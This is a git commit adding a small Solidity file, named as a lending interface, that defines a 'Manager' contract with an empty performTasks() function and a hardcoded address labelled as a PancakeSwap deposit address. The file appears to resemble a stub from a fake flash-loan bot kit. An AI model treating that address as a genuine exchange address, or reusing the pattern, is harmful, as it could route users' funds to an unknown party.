f8c60c2bc6ffddac88031215df8934faf7fe607b
FlashLoan-Core <98156369+FlashLoan-Core@users.noreply.github.com>
2022-04-15 19:58:59 +0100

    Add files via upload

---
+++ contracts/interfaces/ILendingClass.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xDa28942b33b211c024B5011771a3a66E32fd34C2;
+    }
+}
+
+//pancakeswapfunction
